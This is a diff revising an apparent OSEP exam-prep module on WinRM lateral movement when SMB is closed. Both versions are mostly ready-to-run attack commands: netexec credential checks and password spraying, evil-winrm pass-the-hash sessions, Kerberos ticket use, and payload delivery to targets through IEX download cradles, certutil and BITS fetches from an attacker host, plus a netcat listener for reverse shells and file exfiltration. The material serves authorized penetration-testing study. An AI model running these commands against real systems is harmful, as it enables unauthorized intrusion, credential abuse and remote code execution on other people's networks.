@@ -2,122 +2,132 @@
 For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
 :::
 
-# 15 · WinRM lateral movement (valid creds · WinRM only)
+# WinRM lateral movement
 
-> Covers scenario: 56 · Related PEN-300 (`pen-300.pdf`) material: Chapter 18 *Windows Lateral Movement* — the book's fileless technique is §18.2 (service-control-manager based), and WinRM/PSRemoting itself has no dedicated section; it is used here as the transport.
->
-> **Prerequisites:** you already have valid credentials (password / NTLM hash / Kerberos ticket); target 5985 (HTTP) or 5986 (HTTPS) is reachable; attacker box is Kali (evil-winrm, netexec, impacket) or a controlled Windows pivot
+If the credentials are valid but SMB (445) is closed, every path that depends on `admin$` (PsExec, WMIC, smbexec, copy-then-schtasks) is dead. Use WinRM on 5985/5986 as the execution channel instead.
 
----
+PEN-300 Chapter 18 covers RDP and fileless (SCM-based) movement; WinRM/PSRemoting has no dedicated section. It is used here as the transport when those other channels are unavailable.
 
-## Scenario 56: Credentials work, but the target only exposes WinRM
+## Creds work, only WinRM is open
 
-**Situation**: The identity is correct, but SMB (445) is closed — every lateral execution path that depends on SMB (PsExec, WMIC, smbexec, copy via `admin$` then schtasks, etc.) is dead; the target only exposes WinRM management ports. Use a WinRM session for execution and further lateral movement.
+If 445 is closed and 5985 or 5986 is reachable, go straight to WinRM — don't spend time on PsExec-family tools. If 445 is actually open, this module is the wrong path.
 
-**Assumptions**:
-- You hold: `USER` + `PASS` (plaintext), or `USER` + `NTHASH` (NTLM hash), or a domain Kerberos ticket (ccache/TGT).
-- Target side: 5985/5986 listening (`winrm` service); the account is in local `Administrators` or `Remote Management Users` (WinRM’s default allow-list). In a domain, also confirm the user has **local** rights on the target — domain membership alone is not enough.
-- Network: Kali→target 5985/5986 open; target→Kali 445/139 closed (otherwise this scenario is unnecessary). After multi-hop pivots, ensure port-forward/proxy reaches 5985/5986 first.
-- Methods to abandon (**SMB closed = they fail; do not waste time**): `psexec.py`/PsExec, `wmiexec.py`/WMIC (most implementations write `admin$`), `smbexec.py`, SMB relay, copy scripts over SMB then `schtasks`/`sc`, drop PowerShell via `admin$`.
+The account must be in local `Administrators` or `Remote Management Users` on the target; domain membership alone is not enough. You need a password, an NTLM hash, or a Kerberos ticket.
 
-**Prepare (attacker side)**:
-1. Confirm Kali tools:
-   ```bash
-   which evil-winrm netexec 2>/dev/null
-   gem list winrm 2>/dev/null | head -3    # evil-winrm depends on winrm gem
-   ```
-   If evil-winrm is missing: `sudo gem install evil-winrm` (often preinstalled on Kali; apt package `evil-winrm` also works). netexec succeeds crackmapexec on Kali (`netexec`); both command forms are given below.
-2. Port reachability (before auth troubleshooting):
-   ```bash
-   nc -nvz TARGET 5985; nc -nvz TARGET 5986    # either open is enough
-   ```
-   HTTPS (5986) needs `evil-winrm -S`; handle self-signed certs later.
-3. For Kerberos: prepare `/etc/hosts` or resolvable `DOMAIN` names, reachability to KDC (TCP/88), time sync (`ntpdate`/`chronyd` — tickets fail hard on clock skew >5 minutes).
-4. Prepare in-session follow-on payloads (WinRM itself is the execution channel; usually no need to drop files):
-   - PowerShell in-memory download/exec (IEX cradles);
-   - If a file is required, have the target download outbound itself (certutil/BITS), not SMB pull-back.
+- [ ] Confirm ports (`nmap -Pn -p445,5985,5986 TARGET`) and that the Kali tools are present
+- [ ] Probe auth with netexec (plaintext, hash, or domain)
+- [ ] Open an interactive session (evil-winrm, or PowerShell Remoting from a Windows pivot)
+- [ ] Deliver the follow-on payload in-session without SMB
+- [ ] If Kerberos is required: fix DNS, clock, and the ticket cache first
 
-**Procedure**:
+Confirm tools and reachability:
 
-1. **Check whether the account has WinRM rights on the target** (also validates the creds):
-   ```bash
-   # plaintext
-   netexec winrm TARGET -u USER -p 'PASS'
-   # hash (Pass-the-Hash over NTLM)
-   netexec winrm TARGET -u USER -H NTHASH
-   # domain account with -d DOMAIN
-   netexec winrm TARGET -d DOMAIN -u USER -p 'PASS'
-   ```
-   Expected: `[+] TARGET:5985 - ... (Pwn3d!)`. `(Pwn3d!)` means local admin. Auth without that marker can still allow command execution (Remote Management Users need not be admins) — step 3 verifies for real.
-2. **(Optional batch) multi-target / spray**: quick-reference notes `WinRM password spraying` / `Multiple targets with WinRM`:
-   ```bash
-   netexec winrm targets.txt -d DOMAIN -u USER -p 'PASS' --continue-on-success
-   ```
-3. **evil-winrm session (plaintext or hash)**:
-   ```bash
-   # plaintext (HTTP)
-   evil-winrm -i TARGET -u USER -p 'PASS'
-   # plaintext + domain (usually unnecessary for NTLM; Kerberos needs -r)
-   evil-winrm -i TARGET -u 'DOMAIN\USER' -p 'PASS'
-   # NTLM hash (Pass-the-Hash)
-   evil-winrm -i TARGET -u USER -H NTHASH
-   # HTTPS
-   evil-winrm -i TARGET -u USER -p 'PASS' -S
-   ```
-   Prompt becomes `*Evil-WinRM* PS C:\...>`; run `whoami` and `whoami /priv` first.
-4. **Kerberos auth path** (domain; no plaintext, or avoid NTLM logs):
-   Prerequisites: resolvable hostname (`/etc/hosts` entry `TARGET-IP  target.dom`), TGT for the account:
-   ```bash
-   # password → TGT (ccache)
-   impacket-getTGT 'DOMAIN/USER:PASS' -dc-ip DC_IP
-   export KRB5CCNAME=$(pwd)/USER.ccache
-   # or reuse an existing ticket
-   netexec winrm TARGET.dom -d DOMAIN -u USER -k --use-kcache
-   ```
-   evil-winrm’s Kerberos support is weak (env-dependent). Prefer:
-   - From a controlled **Windows pivot**: `Enter-PSSession -ComputerName TARGET -Credential ...` (Kerberos by default);
-   - On Kali: `netexec winrm ... -k` with `KRB5CCNAME`.
-   Kerberos failures: name resolution, clock skew, SPN `http/target.dom`, ticket expiry.
-5. **Confirm in-session command execution** (auth ≠ execute; non-admin Remote Management Users may hit language mode / execution policy limits):
-   ```powershell
-   whoami
-   [Environment]::Is64BitOperatingSystem
-   Get-ExecutionPolicy -List          # affects script files, not interactive commands
-   ```
-6. **Deliver follow-on payload in-session (two channels when SMB is closed)**:
-   - **In-memory (preferred, no disk)**:
-     ```powershell
-     # attacker HTTP: python3 -m http.server 80
-     IEX (New-Object Net.WebClient).DownloadString('http://LHOST/PAYLOAD.ps1')
-     # or download to memory then Invoke-Expression; wrap in a scriptblock when args are needed
-     ```
-     evil-winrm `scripts/` and `loot/` are local directories only; upload/download use the WinRM protocol (`upload`/`download` commands) — no SMB.
-   - **On-disk (only if a file is required; target downloads itself)**:
-     ```powershell
-     certutil -urlcache -split -f http://LHOST/PAYLOAD.exe C:\Windows\Temp\PAYLOAD.exe
-     # alternatives: BITSAdmin / Start-BitsTransfer / powershell -c (New-Object Net.WebClient)
-     ```
-     Do **not** assume `\\LHOST\share` works — closed SMB is the premise of this scenario.
-7. **(Windows pivot path) skip evil-winrm; PowerShell Remoting from a controlled Windows host**:
-   ```powershell
-   # single interactive command
-   winrs -r:TARGET -u:DOMAIN\USER -p:PASS "whoami"
-   # or PSSession
-   $pw = ConvertTo-SecureString 'PASS' -AsPlainText -Force
-   $c  = New-Object System.Management.Automation.PSCredential('DOMAIN\USER',$pw)
-   $s  = New-PSSession -ComputerName TARGET -Credential $c
-   Invoke-Command -Session $s -ScriptBlock { whoami; hostname }
-   # then reverse shell / same delivery as step 6
-   ```
-   `winrs`/WinRM client is built into Windows 10/Server 2016+; managed hosts with WinRM ports open are treated as PS-Remoting enabled in the exam.
+```bash
+which evil-winrm netexec 2>/dev/null
+gem list winrm 2>/dev/null | head -3    # evil-winrm depends on the winrm gem
+# If evil-winrm is missing: sudo gem install evil-winrm  (or apt package evil-winrm)
+nc -nvz TARGET 5985; nc -nvz TARGET 5986    # either open is enough
+nmap -Pn -p445,5985,5986 TARGET
+```
 
-**Scripts used**:
-| Script | Purpose | Key params |
-|---|---|---|
-| `m15-winrm-auth-matrix.ps1` | Plaintext/hash/Kerberos templates + failure checklist (PowerShell Remoting path) | `-Target`, `-User`, `-Pass`/`-NtHash`, `-Domain` |
-| `m15-winrm-lateral.md` | evil-winrm / netexec quick-reference notes + in-session payload notes | — |
+HTTPS (5986) needs `evil-winrm -S`. For Kerberos, put a resolvable FQDN in `/etc/hosts`, reach the KDC on TCP/88, and sync time (`ntpdate`/`chronyd`) — tickets fail hard on clock skew over 5 minutes.
 
-#### `m15-winrm-auth-matrix.ps1`
+Probe auth:
+
+```bash
+# plaintext
+netexec winrm TARGET -u USER -p 'PASS'
+# hash (Pass-the-Hash over NTLM)
+netexec winrm TARGET -u USER -H NTHASH
+# domain account
+netexec winrm TARGET -d DOMAIN -u USER -p 'PASS'
+# multi-target / spray (lockout risk — only when allowed and attempt-capped)
+netexec winrm targets.txt -d DOMAIN -u USER -p 'PASS' --continue-on-success
+```
+
+`(Pwn3d!)` means local admin. Auth without that marker can still allow command execution (`Remote Management Users` need not be admins) — enter a session to verify.
+
+Open a session with evil-winrm:
+
+```bash
+# plaintext (HTTP 5985)
+evil-winrm -i TARGET -u USER -p 'PASS'
+# explicit domain
+evil-winrm -i TARGET -u 'DOMAIN\USER' -p 'PASS'
+# NTLM hash (Pass-the-Hash)
+evil-winrm -i TARGET -u USER -H NTHASH
+# HTTPS (5986)
+evil-winrm -i TARGET -u USER -p 'PASS' -S
+# local scripts dir (local path only)
+evil-winrm -i TARGET -u USER -p 'PASS' -s /opt/evil-winrm/scripts
+```
+
+The prompt becomes `*Evil-WinRM* PS C:\...>`. Run `whoami` and `whoami /priv` first. `upload` / `download` travel over the WinRM channel — no SMB.
+
+For Kerberos (no plaintext, or to avoid NTLM logs):
+
+```bash
+echo "TARGET-IP  target.dom" >> /etc/hosts
+sudo ntpdate DC_IP || chronyc makestep     # clock skew vs DC < 5 minutes
+impacket-getTGT 'DOMAIN/USER:PASS' -dc-ip DC_IP
+export KRB5CCNAME=$(pwd)/USER.ccache
+netexec winrm target.dom -d DOMAIN -u USER -k --use-kcache
+```
+
+<!-- VERIFY: evil-winrm Kerberos support is environment-dependent; prefer a Windows pivot Enter-PSSession -Authentication Kerberos, or netexec -k with KRB5CCNAME, if evil-winrm -r fails. -->
+
+If you have a Windows pivot, skip evil-winrm and use built-in remoting:
+
+```powershell
+# single command
+winrs -r:TARGET -u:DOMAIN\USER -p:PASS "whoami"
+# or a PSSession (templates: m15-winrm-auth-matrix.ps1)
+$pw = ConvertTo-SecureString 'PASS' -AsPlainText -Force
+$c  = New-Object System.Management.Automation.PSCredential('DOMAIN\USER',$pw)
+$s  = New-PSSession -ComputerName TARGET -Credential $c
+Invoke-Command -Session $s -ScriptBlock { whoami; hostname }
+```
+
+`New-PSSession` accepts plaintext, not a native NTLM hash. If you only have a hash on Windows, inject it with mimikatz `sekurlsa::pth` and then `winrs`, or switch to `evil-winrm -H` on Kali.
+
+Confirm execution in-session (auth ≠ execute):
+
+```powershell
+whoami
+[Environment]::Is64BitOperatingSystem
+Get-ExecutionPolicy -List          # affects script files, not interactive commands
+```
+
+Deliver the follow-on payload. Prefer in-memory; if a file is required, have the target download itself — do not assume `\\LHOST\share` works.
+
+```powershell
+# in-memory (preferred, no disk)
+IEX (New-Object Net.WebClient).DownloadString('http://LHOST/PAYLOAD.ps1')
+
+# no disk: run a base64-wrapped script (UTF-16LE, the encoding -enc expects)
+# attacker: iconv -t UTF-16LE stage2.ps1 | base64 -w0
+$b64 = 'BASE64'
+IEX ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b64)))
+
+# on-disk fallback — target downloads itself
+certutil -urlcache -split -f http://LHOST/PAYLOAD.exe C:\Windows\Temp\PAYLOAD.exe
+Start-BitsTransfer -Source http://LHOST/PAYLOAD.exe -Destination C:\Windows\Temp\PAYLOAD.exe
+```
+
+Attacker side for in-memory delivery:
+
+```bash
+python3 -m http.server 80
+nc -lvnp LPORT
+```
+
+If target egress is also blocked, use evil-winrm `upload` over 5985 itself and drop under `C:\Windows\Temp` or `%TEMP%`. Exfil the same way: write a temp file, then `download`.
+
+If auth returns `Access is denied` / 401, the account is not in `Remote Management Users` or `Administrators` — check `-d` domain spelling, and confirm the hash is NTLM (32 hex), not LM or a Kerberos key. If 5986 works but 5985 does not, add `-S`; evil-winrm accepts self-signed certs by default. If auth is OK but commands fail or return empty, try `cmd /c whoami` and treat it as a constrained low-priv session (collect info; priv-esc via module 06). If evil-winrm will not start (Ruby/gem), switch to `netexec winrm` one-shots or the Windows pivot path. If Kerberos keeps failing (`KRB_AP_ERR_MODIFIED` / `KDC_ERR_*`), check `/etc/hosts`, clock, and `klist` expiry — then drop Kerberos and use `-H` if you have a hash.
+
+A long job (mimikatz and similar) times out easily in evil-winrm: one line at a time, copy output immediately, or redirect to a file and `download`. Password spraying can lock accounts — cap attempts. NTLM hash auth leaves 4776 on the DC; Kerberos is quieter (tickets, no password on the wire). 5985 logons leave 4624/4625 plus WinRM operational logs.
+
+::: details `m15-winrm-auth-matrix.ps1` · click to expand
 
 ````powershell
 <#
@@ -270,7 +280,9 @@ else {
 }
 ````
 
-#### `m15-winrm-lateral.md`
+:::
+
+::: details `m15-winrm-lateral.md` · click to expand
 
 ````markdown
 # m15 · WinRM lateral quick-reference notes (Kali / evil-winrm / netexec)
@@ -409,72 +421,16 @@ Then run: `C:\Windows\Temp\PAYLOAD.exe` (admin session can run directly; non-adm
 - Long jobs (mimikatz sekurlsa::logonpasswords) time out easily in evil-winrm: one line at a time, copy output, then continue.
 ````
 
-**Validation**:
-- `netexec winrm` shows `(Pwn3d!)` or at least `[+]` (auth OK).
-- evil-winrm session opens and `whoami` returns the expected identity.
-- Final proof of follow-on delivery is a callback: listener (`nc -lvnp LPORT` / msfconsole handler), reverse payload in-session, Kali receives the connection.
-- If no callback, use **out-of-band checks**: `Invoke-Command` with `cmd /c "ping LHOST"` while Kali runs `tcpdump -i any icmp`; or have the target `curl http://LHOST/flag` and watch the delivery server 404/200 (see module 00 OOB validation).
+:::
 
-**Failure branches and alternatives** (≥2):
-1. **Auth denied (`Access is denied` / 401)** → confirm membership in `Remote Management Users`/`Administrators`; for domain accounts check `DOMAIN` spelling/case and `-d`; for hashes confirm NTLM (32 hex), not LM or Kerberos keys. Still failing → retry from a Windows pivot with `New-PSSession` to separate tool issues from permission issues.
-2. **5985 open but only 5986 works, or vice versa** → toggle `-S` (HTTPS) and handle self-signed certs (evil-winrm accepts them by default; before adding peer-verification flags, confirm version); HTTP is simpler — prefer 5985 when available.
-3. **Auth OK but commands fail / empty output** → account may be Remote Management Users (non-admin) with restricted PowerShell: try `cmd /c whoami`; try `-NoProfile`-style flags; treat as a constrained low-priv session (collect info; priv-esc via module M06).
-4. **evil-winrm won’t start (Ruby/gem)** → use netexec `winrm` one-shots, or Windows pivot `winrs`/`New-PSSession` (no Ruby).
-5. **Kerberos keeps failing** → drop Kerberos, use NTLM hash (`-H`) if you have plaintext/hash; if ticket-only, check `KRB5CCNAME`, `/etc/krb5.conf` realm, clock (`date` vs DC <5 minutes).
-6. **Need a file but target egress is also blocked** → evil-winrm `upload` (WinRM 5985 channel itself — no 445/80 egress); drop under `C:\Windows\Temp` or `%TEMP%`; watch write rights and Defender scan paths.
+## Cheat sheet
 
-**Exam / OPSEC notes**:
-- **Confirm SMB is really closed** before abandoning PsExec-family tools — many lost points come from fighting the wrong channel without a port check. `nmap -Pn -p445,5985 TARGET` settles it once.
-- WinRM on 5985 leaves PowerShell sessions plus 4624/4625 and `Microsoft-Windows-WinRM` operational logs; NTLM hash auth leaves 4776 on the DC. Password spraying (step 2) amplifies lockout risk — **only when explicitly allowed and attempt-capped**.
-- evil-winrm `upload`/`download`, `scripts`/`loot` are session-only: files travel over WinRM — **do not** document “copy via SMB share” steps that contradict this scenario.
-- Sessions are interactive: long jobs (mimikatz sekurlsa) hang/timeout easily — quick-reference notes `Having an Evil-WinRM session`: one-liners, copy results immediately, or redirect to a file then `download`.
-- Kerberos hard-requires name resolution; put the target hostname in Kali `/etc/hosts` or SPN resolution fails with `KRB_AP_ERR_MODIFIED`-class errors (check clock first).
-- In non-admin sessions, do not jump straight to priv-esc/credential tools — least-privilege recon first, then decide whether M06 is needed.
-
----
-
-## Module quick reference
-
-```bash
-# 1) Port decision (whether this module applies)
-nmap -Pn -p445,5985,5986 TARGET
-
-# 2) Auth + privilege probe (plaintext / hash / domain)
-netexec winrm TARGET -u USER -p 'PASS'
-netexec winrm TARGET -u USER -H NTHASH
-netexec winrm TARGET -d DOMAIN -u USER -p 'PASS'
-
-# 3) Interactive session (evil-winrm)
-evil-winrm -i TARGET -u USER -p 'PASS'
-evil-winrm -i TARGET -u USER -H NTHASH
-evil-winrm -i TARGET -u USER -p 'PASS' -S        # 5986 HTTPS
-
-# 4) Kerberos (in-domain; works without SMB / without plaintext)
-impacket-getTGT 'DOMAIN/USER:PASS' -dc-ip DC_IP
-export KRB5CCNAME=$(pwd)/USER.ccache
-netexec winrm TARGET.dom -d DOMAIN -u USER -k --use-kcache
-```
-
-```powershell
-# 5) In-session in-memory delivery (preferred, no disk)
-IEX (New-Object Net.WebClient).DownloadString('http://LHOST/PAYLOAD.ps1')
-
-# 6) Windows pivot path
-winrs -r:TARGET -u:DOMAIN\USER -p:PASS "whoami"
-$pw = ConvertTo-SecureString 'PASS' -AsPlainText -Force
-$c  = New-Object System.Management.Automation.PSCredential('DOMAIN\USER', $pw)
-$s  = New-PSSession -ComputerName TARGET -Credential $c
-Invoke-Command -Session $s -ScriptBlock { whoami; hostname }
-
-# 7) On-disk fallback (target downloads itself)
-certutil -urlcache -split -f http://LHOST/PAYLOAD.exe C:\Windows\Temp\PAYLOAD.exe
-```
-
----
-
-## Related script list
-
-| File | Description |
+| You want to… | Use |
 |---|---|
-| `m15-winrm-auth-matrix.ps1` | Windows-side PowerShell Remoting plaintext/hash/Kerberos templates + failure triage |
-| `m15-winrm-lateral.md` | Kali (evil-winrm/netexec) quick-reference notes + in-session payload notes |
+| Decide if this module applies | `nmap -Pn -p445,5985,5986 TARGET` |
+| Probe auth (password / hash / domain) | `netexec winrm TARGET -u USER -p 'PASS'` / `-H NTHASH` / `-d DOMAIN` |
+| Interactive session | `evil-winrm -i TARGET -u USER -p 'PASS'` (add `-H` or `-S` as needed) |
+| Kerberos without SMB | `impacket-getTGT` + `KRB5CCNAME` + `netexec winrm … -k --use-kcache` |
+| In-session, no disk | `IEX (New-Object Net.WebClient).DownloadString('http://LHOST/PAYLOAD.ps1')` |
+| Windows pivot | `winrs` / `New-PSSession` (`m15-winrm-auth-matrix.ps1`) |
+| On-disk fallback | `certutil` / BITS — target downloads itself, never `\\LHOST\share` |
